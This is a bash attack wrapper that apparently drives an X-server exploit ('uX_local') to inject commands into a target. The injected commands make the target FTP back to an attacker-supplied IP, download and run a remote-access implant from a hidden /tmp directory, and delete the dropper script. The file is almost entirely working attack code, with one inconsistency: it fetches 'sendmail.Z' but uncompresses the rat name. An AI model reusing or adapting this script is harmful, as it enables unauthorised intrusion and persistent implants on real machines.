#!/bin/bash
echo -e "\n\n\n\n\nYOU REALLY SHOULD BE USING ys.auto or better yet -sploit



BUT IF YOU MUST USE $0 at least use /current/bin/nc.YS instead of just nc.


Packrat now has an option to do just that:

packrat -n /current/bin/nc.YS


"

sleep 4

usage ()
{
echo "Usage: ${0}
	-U [ userid for FTP back to local IP ]
	-P [ password for FTP back to local IP ]
	-l [ IP of attack machine (NO DEFAULT) ]
	-r [ name of rat on target (NO DEFAULT) ]
	-x [ port to start mini X server on DEFAULT = 12121 ]
	-d [ directory to work from/create on target DEFAULT = /tmp/.X11R6]"

echo "example: ${0} -U user1 -P pass1 -l 192.168.1.1 -r nscd -x 9999 -d /tmp/.strange"
}

DIR=0
FTP_PASS=0
FTP_USER=0
XPORT=0

if [ $# -lt 4 ]
then
	usage
	exit 1
fi

while getopts hU:P:l:r:d:x: optvar
	do
	        case "$optvar"
	        in
			h)
			   usage
			   exit 1
			   ;;
			    P) FTP_PASS=${OPTARG}
			   ;;
			    U) FTP_USER=${OPTARG}
			   ;;
		        l) LOCAL_IP=${OPTARG} 
			   ;;
		        r) RAT=${OPTARG} 
			   ;;
			    x) XPORT=${OPTARG}
			   ;;
			    d) DIR=${OPTARG}
			   ;;
		        *) echo "invalid option"
			   usage
			   exit 1
			   ;;
		esac
	done

if [ ${FTP_PASS} = 0 ]
then
	usage
    exit 2
fi

if [ ${FTP_USER} = 0 ]
then
	usage
    exit 3
fi

if [ ${DIR} = 0 ]
then
	DIR="/tmp/.X11R6"
fi

if [ ${XPORT} = 0 ]
then
	XPORT=12121
fi

echo
echo "########################################"
echo "Local IP = ${LOCAL_IP}"
echo "FTP userid = ${FTP_USER}"
echo "FTP password = ${FTP_PASS}"
echo "Name of Rat = ${RAT}"
echo "Starting mini X server on port ${XPORT}"
echo "Directory to create/use = ${DIR}"
echo "########################################"
echo


SCRIPT=/tmp/.af1324
VENDOR_STR="\`echo '
PATH=/usr/openwin/bin:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/gnu/bin:/usr/ucb:/usr/X11R6/bin
export PATH
mkdir ${DIR} 2>&1
cd ${DIR} 2>&1
/bin/ftp -in<<EOF  >N    2>&1\012open    $LOCAL_IP\012user ${FTP_USER} ${FTP_PASS}\012bi\012get sendmail.Z\012bye
EOF 2>&1
uncompress -f ${RAT}.Z 2>&1
chmod 0700 ${DIR}/${RAT} 2>&1
PATH=${DIR} ${RAT} 2>&1
rm ${SCRIPT}' > ${SCRIPT}; /bin/sh ${SCRIPT} 2>&1\`"

./uX_local -e "${VENDOR_STR}" -v -p ${XPORT} -c xxx
